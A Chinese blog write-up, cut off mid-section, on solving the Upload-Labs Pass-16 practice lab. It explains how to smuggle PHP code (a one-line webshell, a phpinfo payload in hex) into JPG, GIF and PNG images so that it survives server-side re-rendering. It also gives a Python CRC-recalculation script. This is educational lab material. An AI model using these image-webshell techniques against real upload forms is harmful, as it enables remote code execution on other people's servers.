@@ -1,0 +1,463 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Upload-Labs之Pass-16 | Braindance</title><meta name="keywords" content="文件上传漏洞"><meta name="author" content="Braindance"><meta name="copyright" content="Braindance"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="前言​    我在这道题上花了快一天的时间，但是也学到了不少姿势，觉得东西应该足够多，而且参考了的博客发现这道题算是有歧义的，不知道作者想要考察的点是哪一个，所以算是有两种解法吧，可惜的是两种方法都不算是大成功，只有部分成功执行了。 ​    参考博客：upload-labs之pass 16详细分析 Pass-16​    源码（三种图片的判定，只贴一个吧，篇幅小一点）： 123456789101">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Upload-Labs之Pass-16">
+<meta property="og:url" content="https://braindance.tk/2020/Upload-Labs4/index.html">
+<meta property="og:site_name" content="Braindance">
+<meta property="og:description" content="前言​    我在这道题上花了快一天的时间，但是也学到了不少姿势，觉得东西应该足够多，而且参考了的博客发现这道题算是有歧义的，不知道作者想要考察的点是哪一个，所以算是有两种解法吧，可惜的是两种方法都不算是大成功，只有部分成功执行了。 ​    参考博客：upload-labs之pass 16详细分析 Pass-16​    源码（三种图片的判定，只贴一个吧，篇幅小一点）： 123456789101">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201116224711.jpg">
+<meta property="article:published_time" content="2020-11-16T14:50:25.000Z">
+<meta property="article:modified_time" content="2020-12-06T14:14:26.056Z">
+<meta property="article:author" content="Braindance">
+<meta property="article:tag" content="文件上传漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201116224711.jpg"><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/other/favicon.png"><link rel="canonical" href="https://braindance.tk/2020/Upload-Labs4/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/guobang-yoo/CDN@master/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?283f1b95677b0d1b02cde7fa66532e1f";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  hexoversion: '5.0.2',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"这篇文章距离当时已经","messageNext":"天了，你懂我意思吧。"},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isSidebar: true,
+  postUpdate: '2020-12-06 22:14:26'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {
+  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }
+})()</script><meta name="referrer" content="no-referrer-when-downgrade" /><style type="text/css">#toggle-sidebar {bottom: 80px}</style><!-- 音频播放 --><link rel="stylesheet" href="/dist/APlayer.min.css"><div id="aplayer"></div><script type="text/javascript" src="/dist/APlayer.min.js"></script><script type="text/javascript" src="/dist/music.js"></script><meta name="generator" content="Hexo 5.0.2"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/other/qiyu.jpg" onerror="onerror=null;src='https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/other/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">24</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">31</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">5</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-igloo"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-box"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tag"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-book"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-dragon"></i><span> 传送门</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/shuoshuo/"><i class="fa-fw fas fa-star-half"></i><span> 说说</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/guestbook/"><i class="fa-fw fas fa-comment-dots"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-glass-cheers"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-ghost"></i><span> 关于</span></a></div></div></div></div><div id="body-wrap"><div id="sidebar"><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-16"><span class="toc-number">2.</span> <span class="toc-text">Pass-16</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E6%96%B9%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">第一种方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#jpg%E6%A0%BC%E5%BC%8F"><span class="toc-number">3.1.</span> <span class="toc-text">jpg格式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%86%E5%A4%87%E5%B9%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">3.1.1.</span> <span class="toc-text">准备并上传</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E9%AA%8C%E8%AF%81"><span class="toc-number">3.1.2.</span> <span class="toc-text">文件包含验证</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%A0%BC%E5%BC%8F"><span class="toc-number">3.2.</span> <span class="toc-text">其他格式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E6%96%B9%E6%B3%95"><span class="toc-number">4.</span> <span class="toc-text">第二种方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GIF%E6%A0%BC%E5%BC%8F"><span class="toc-number">4.1.</span> <span class="toc-text">GIF格式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%86%E5%A4%87%E5%B9%B6%E4%B8%8A%E4%BC%A0-1"><span class="toc-number">4.1.1.</span> <span class="toc-text">准备并上传</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%AF%94%E8%BE%83"><span class="toc-number">4.1.2.</span> <span class="toc-text">文件比较</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E9%AA%8C%E8%AF%81-1"><span class="toc-number">4.1.3.</span> <span class="toc-text">文件包含验证</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#png%E6%A0%BC%E5%BC%8F"><span class="toc-number">4.2.</span> <span class="toc-text">png格式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%A1%E7%AE%97CRC%E7%A0%81"><span class="toc-number">4.2.1.</span> <span class="toc-text">计算CRC码</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%87%86%E5%A4%87"><span class="toc-number">4.2.1.1.</span> <span class="toc-text">准备</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AE%A1%E7%AE%97CRC%E7%A0%81-1"><span class="toc-number">4.2.1.2.</span> <span class="toc-text">计算CRC码</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E7%94%9F%E6%88%90%E5%9B%BE%E7%89%87%EF%BC%88%E5%86%99%E5%85%A5%E5%AE%9E%E9%99%85%E6%95%B0%E6%8D%AE%E6%A8%A1%E5%9D%97%EF%BC%89"><span class="toc-number">4.2.2.</span> <span class="toc-text">直接生成图片（写入实际数据模块）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jpg%E6%A0%BC%E5%BC%8F-1"><span class="toc-number">4.3.</span> <span class="toc-text">jpg格式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%86%E5%A4%87-1"><span class="toc-number">4.3.1.</span> <span class="toc-text">准备</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%92%E5%85%A5%E4%BB%A3%E7%A0%81"><span class="toc-number">4.3.2.</span> <span class="toc-text">插入代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E5%B9%B6%E9%AA%8C%E8%AF%81"><span class="toc-number">4.3.3.</span> <span class="toc-text">上传并验证</span></a></li></ol></li></ol></li></ol></div></div></div><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201116224711.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Braindance</a></span><span id="menus"><div id="search_button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-igloo"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-box"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tag"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-book"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-dragon"></i><span> 传送门</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/shuoshuo/"><i class="fa-fw fas fa-star-half"></i><span> 说说</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/guestbook/"><i class="fa-fw fas fa-comment-dots"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-glass-cheers"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-ghost"></i><span> 关于</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">Upload-Labs之Pass-16</div></div><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">发表于</span><time datetime="2020-11-16T14:50:25.000Z" title="undefined 2020-11-16 22:50:25">2020-11-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/DROPS/">DROPS</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>12分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2020/Upload-Labs4/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count comment-count" data-xid="/2020/Upload-Labs4/" itemprop="commentCount"></span></a></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    我在这道题上花了快一天的时间，但是也学到了不少姿势，觉得东西应该足够多，而且参考了的博客发现这道题算是有歧义的，不知道作者想要考察的点是哪一个，所以算是有两种解法吧，可惜的是两种方法都不算是大成功，只有部分成功执行了。</p>
+<p>​    参考博客：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2657#toc-4">upload-labs之pass 16详细分析</a></p>
+<h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><p>​    源码（三种图片的判定，只贴一个吧，篇幅小一点）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    $filename = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    $filetype = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    $tmpname = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    $target_path=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.basename($filename);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    $fileext= substr(strrchr($filename,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>(($fileext == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; ($filetype==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="literal">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$newfilename;</span><br><span class="line">                imagejpeg($im,$img_path);</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">&quot;png&quot;</span>) &amp;&amp; ($filetype==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        ......</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">&quot;gif&quot;</span>) &amp;&amp; ($filetype==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        .....</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    提示：<code>本pass重新渲染了图片！</code>。说明对图片进行了二次渲染，我的理解就是把上传的图片，根据一些标准，只把图片中的图片信息提取出来，再生成一个图片，可以有效避免图片马。</p>
+<p>​    首先是分析一波源码：</p>
+<p>​    以jpg文件判定为例。获取文件名、类型、临时文件路径，获取文件后缀，进入jpg图片判定，判定的方式是通过文件后缀和文件的类型判定，再执行<code>move_uploaded_file</code>函数先把文件移动到<code>upload</code>文件夹，现在文件路径是<code>$target_path</code>，之后对图片进行二次渲染。</p>
+<p>​    二次渲染用到了<code>imagecreatefromjpeg</code>函数，官方解释：由文件或 URL 创建一个新图象，返回一图像标识符，代表了从给定的文件名取得的图像（这时候图像对象还是一个空的）。然后判断是否是一个图片文件，如果不是的话执行<code>unlink</code>函数删除文件，否则，为新图片随机一个名称，执行<code>imagejpeg</code>函数把图象输出到新文件<code> $newfilename</code>。再将之前用户上传的文件<code>$target_path</code>删除掉。</p>
+<p>​    根据上面的分析就能得出来两种思路：</p>
+<ol>
+<li><strong>访问二次渲染之前的上传的文件。</strong></li>
+<li><strong>在图片二次渲染以后图片马未失效。</strong></li>
+</ol>
+<h2 id="第一种方法"><a href="#第一种方法" class="headerlink" title="第一种方法"></a>第一种方法</h2><p>​    （Linux环境、php版本7.2.21）</p>
+<p>​    因为二次渲染那部分<code>if、else</code>无论如何都会执行<code>unlink</code>函数删除你的文件，需要在执行<code>imagecreatefromjpeg</code>时报错才能访问到自己原来上传的文件。</p>
+<h3 id="jpg格式"><a href="#jpg格式" class="headerlink" title="jpg格式"></a>jpg格式</h3><h4 id="准备并上传"><a href="#准备并上传" class="headerlink" title="准备并上传"></a>准备并上传</h4><p>​    需要准备只含有一句话木马的文件并命名为.jpg格式。直接上传。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116200050.png"></p>
+<h4 id="文件包含验证"><a href="#文件包含验证" class="headerlink" title="文件包含验证"></a>文件包含验证</h4><p>​    上传以后我使用的在线靶场网页中题目部分直接消失了，这就说明函数执行过程中出错导致页面也没有正常返回。然后就可以使用<code>inclue.php</code>文件包含访问刚刚上传的文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116200401.png">    </p>
+<h3 id="其他格式"><a href="#其他格式" class="headerlink" title="其他格式"></a>其他格式</h3><p>​    如图成功访问就是图片马上传成功了。但是这个方法我只有<code>jpg</code>格式的文件上传成功了，另外两种格式的图片没有上传成功，这个我感觉需要了解<code>imagecreatefromjpeg</code>、<code>imagecreatefrompng</code>、<code>imagecreatefromgif</code>，这三个函数的原理，让其报错即可。</p>
+<h2 id="第二种方法"><a href="#第二种方法" class="headerlink" title="第二种方法"></a>第二种方法</h2><p>​    （windows环境，php版本5.2.17）</p>
+<p>​    这种方法是让图片码在经过二次渲染以后，能保证代码不会被二次渲染给过滤掉。从最简单的一个一个来。</p>
+<p>​    用到的工具是<strong>Beyond Compare 4</strong>，是一个文件比较的工具，就是查看图片渲染修改的哪些部分，还可以查看文件的16进制格式。</p>
+<h3 id="GIF格式"><a href="#GIF格式" class="headerlink" title="GIF格式"></a>GIF格式</h3><h4 id="准备并上传-1"><a href="#准备并上传-1" class="headerlink" title="准备并上传"></a>准备并上传</h4><p>​    上传一个使用<code>copy /b</code>指令制作的图片马，之前文章第13题用过。假设上传的图片马为<strong>yoo.gif</strong>，上传成功以后再下载下载的文件名为<strong>2119840023.gif</strong>。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116203245.png"></p>
+<h4 id="文件比较"><a href="#文件比较" class="headerlink" title="文件比较"></a>文件比较</h4><p>​    使用前面说的<strong>Beyond Compare 4</strong>工具进行比较，左边是渲染前的文件，右边是渲染后的文件，图片中白色的地方就是两个文件<strong>相同</strong>的地方，红色部分则是文件不同的地方。看的出来图片文件的前面一大部分二次渲染的时候都没有改变，所以我们可以直接将代码放在这一部分逃过二次渲染。<code>&lt;?php phpinfo(); ?&gt;</code>的十六进制是<code>3C 3F 70 68 70 20 70 68 70 69 6E 66 6F 28 29 3B 20 3F 3E</code>直接粘贴插入，在右边框中右键保存文件再进行上传。</p>
+<h4 id="文件包含验证-1"><a href="#文件包含验证-1" class="headerlink" title="文件包含验证"></a>文件包含验证</h4><p>​    上传以后进行文件包含，代码执行成功。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116204104.png"></p>
+<p>​    为了验证我们的想法，我们可以刚刚把上传的图片再下载下载，查看插入的代码是否逃过了二次渲染（废话执行成功了代码肯定在）。</p>
+<h3 id="png格式"><a href="#png格式" class="headerlink" title="png格式"></a>png格式</h3><p>​    这题自己原来打算模仿gif的方法修改图片，但是上传以后下载，对比文件十六进制不同的时候我傻了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116204635.png"></p>
+<p>​    这不同还是一段一段的，根本不可能模仿gif的方法，上面那一段相同的还是图片的<strong>头标识</strong>部分，修改的话就不是png格式图片，更过不了。</p>
+<p>​    所以我直接看答案了，还是前言里的<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2657#toc-3">博客</a>。png图片由3个以上的数据块组成，然后又分了图片基本信息、实际数据块、辅助数据块blablablabl，而且数据块中还有CRC码，学过计算机网络的都知道CRC码是验证错误的，自己随便插入代码以后不修改CRC码肯定是过不了的。</p>
+<p>​    所以又出来了两种方法：</p>
+<ol>
+<li>修改CRC码</li>
+<li>直接生成图片</li>
+</ol>
+<h4 id="计算CRC码"><a href="#计算CRC码" class="headerlink" title="计算CRC码"></a>计算CRC码</h4><p>​    计算CRC码的<code>python</code>脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">png &#x3D; open(r&#39;1.png&#39;,&#39;rb&#39;)</span><br><span class="line">a &#x3D; png.read()</span><br><span class="line">png.close()</span><br><span class="line">hexstr &#x3D; binascii.b2a_hex(a)</span><br><span class="line"></span><br><span class="line">&#39;&#39;&#39; PLTE crc &#39;&#39;&#39;</span><br><span class="line">data &#x3D;  &#39;504c5445&#39;+ re.findall(&#39;504c5445(.*?)49444154&#39;,hexstr)[0]</span><br><span class="line">crc &#x3D; binascii.crc32(data[:-16].decode(&#39;hex&#39;)) &amp; 0xffffffff</span><br><span class="line">print hex(crc)</span><br></pre></td></tr></table></figure>
+
+<h5 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h5><p>​    php底层在对PLTE数据块验证的时候,主要进行了CRC校验.所以可以在该部分<strong>写入代码</strong>，再重新计算CRC码，再修改原来的CRC码即可。</p>
+<h5 id="计算CRC码-1"><a href="#计算CRC码-1" class="headerlink" title="计算CRC码"></a>计算CRC码</h5><p>​    脚本会打开名为1.png的文件然后输出计算以后的CRC码结果。在把结果覆盖原来的CRC码上传图片就不会出错了。</p>
+<p>这个方法我没有尝试，因为我不会python。<del>都2020年了还有人不会python，不会吧不会吧</del>。😒</p>
+<p>等我学会在回来改这一篇吧。</p>
+<h4 id="直接生成图片（写入实际数据模块）"><a href="#直接生成图片（写入实际数据模块）" class="headerlink" title="直接生成图片（写入实际数据模块）"></a>直接生成图片（写入实际数据模块）</h4><p>​    国外大牛的脚本，直接运行就会生成一个图片</p>
